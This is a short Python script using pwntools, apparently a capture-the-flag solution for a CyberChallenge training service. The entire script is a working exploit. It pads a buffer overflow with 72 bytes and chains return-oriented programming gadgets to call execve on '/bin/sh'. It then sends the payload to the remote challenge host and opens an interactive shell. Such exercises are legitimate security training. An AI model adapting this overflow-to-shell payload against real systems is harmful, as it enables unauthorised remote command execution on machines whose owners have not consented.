# mov rax, 59
# mov rdi, 0x400000+0x0002004
# mov rsi, 0
# mov rdx, 0
# syscall

from pwn import *

mov_rdi_rsp = 0x0000000000401196
pop_rax = 0x0000000000401199
pop_rdi = 0x000000000040119b
pop_rdx = 0x000000000040119f
pop_rsi = 0x000000000040119d
syscall = 0x00000000004011a3

offset = 72

payload = b"A" * offset
payload += p64(mov_rdi_rsp) + b'/bin/sh\x00' + p64(pop_rax) + p64(59) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)

p = remote("cyberchallenge.disi.unitn.it", 9103)
p.sendline(payload)
p.interactive()

